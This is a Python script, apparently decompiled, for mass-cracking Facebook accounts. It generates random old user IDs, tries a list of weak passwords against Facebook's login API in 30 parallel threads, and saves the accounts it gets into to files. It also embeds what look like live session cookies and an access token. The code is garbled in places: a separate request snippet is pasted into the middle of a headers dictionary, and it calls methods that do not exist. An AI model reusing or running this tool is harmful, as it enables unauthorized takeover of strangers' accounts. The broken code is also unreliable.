# Decompile by Mardis (Tools By Md. Sobuj hasan)
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor

logo = """
\033[92;1m╭───────────────────────────────────────────────────────────╮
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m│                 \033[1;37m \033[1;93m███████╗ ██████╗ ██████╗ ██╗   ██╗     ██╗
\033[92;1m│                 \033[1;37m \033[1;93m██╔════╝██╔═══██╗██╔══██╗██║   ██║     ██║
\033[92;1m│                 \033[1;37m \033[1;93m███████╗██║   ██║██████╔╝██║   ██║     ██║
\033[92;1m│                 \033[1;37m \033[1;93m╚════██║██║   ██║██╔══██╗██║   ██║██   ██║
\033[92;1m│                 \033[1;37m \033[1;93m███████║╚██████╔╝██████╔╝╚██████╔╝╚█████╔╝
\033[92;1m│                 \033[1;37m \033[1;93m╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝  ╚════╝ 
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m╰───────────────────────────────────────────────────────────╯
\033[92;1m╰───────────────────────────────────────────────────────────╯
 \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m SOBUJ KING }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
   """
print("")
os.system('xdg-open https://www.facebook.com/SOBUJ1159 ')

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print(' \033[1;95mDont Decode My Tools \033[0m')
		print(' \033[1;95mThis Tool Clone Old Random Account \033[0m')
		print("")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s[Just-Now-Open]"%(P,G,R,Y,B))
		print(" \033[1;96m[2] EXIT")
		__SOBUJ = input("\n\033[0;91m>>> \033[0;92m select  \033[0m: ")
		if __SOBUJ in ["", " "]:
			Main()
		elif __SOBUJ in ["1", "01"]:
			self.fbtua()
		else:
			exit()

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 5000,10000,20000,50,000.: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(G,Y,B,Y))
				print("%s EXAMPLE : %s786786,123456,1234567,123456789"%(G,Y))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n[>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.yellow(
			"\r\r %s[SOBUJ] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				    import requests

cookies = {
    'datr': 'jkMdZcZ54ueRMdbCGo6gN343',
    'sb': 'jkMdZSSGurmKyOQj4QqfOYW-',
    'zsh': 'ASS-rT8nNSvpRBIsoXh1KsX-DEamt5Egxg9fD1K37CcSKaZo4sqflVKQL22orEJ65V-I82Ndwi45wt8g92NzRwkzoKRE6EwRAPoRMtH7ul6BoDCl4qXpfnuPTeZOR57RmTXxzv6e4eVOu16_u-kk5H8IolsrYsEH-r4GaapZMFJjZ6IJwZW5htAPL_35KAPffLhesU44dqeFZmD2JfxnmXsI7xcWIVhyA89_N4RByiCrGzpgFw6vUaqHkE6dVY0fZVbtWM7N5uk7GpYrDyBQbDAydJ4M3a50jqvat6HM_OU5MdklOqZ4iCeYfVQeJApdIoB6mDcQ',
    'm_pixel_ratio': '2',
    'wd': '360x728',
    'fr': '0d1636CCVdCMErkrj..BlHUOO.Yx.AAA.0.0.BlHU5v.AWUaSpg8lyg',
}

headers = {
                    'authority': 'p.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
                    'cache-control': 'max-age=0',
                    'dpr': '2',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"Infinix X688B"',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"11.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'viewport-width': '980',}

response = requests.get(
    'https://p.facebook.com/?rtime=1696419412&subno_key=AaFBfmxBVajy9VDtIFTG-sUZVv72F0mW5-LjojvHgBk31B2w4VeiL9RLHFnHU9lmRRX2r23FAZCLBCcFK5nIiTk9wlH9796jPdqZo2_G6QLte7BYlkJLAshM7lY9NaLJwMoI7QJlWoGWNsnWKEnvmeD6TC_L0P5aTX1hGD707Lz5u6OlkJnqLxSl5HjK39bQ8tWPRQAp2nLjR3PhSdG46fScN7nJweHHSFzgHdQZpmZM3AyYYF93tmcdkK10wrkpUKkhFmUZrq2ggqY0NkVHHH-5nSpUM0qPwuoph4ImI33uLLxxB0j1JQ5yyU7LCGBYg2w&hrc=1&wtsid=rdr_0lTAdNlTL0lCb1qEd&refsrc=deprecated&_rdr',
    cookies=cookies,
    headers=headers,
)
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [SOBUJ-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").yellow("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [SOBUJ-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").Red("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

try:Main()
except Exception as e:exit(str(e))

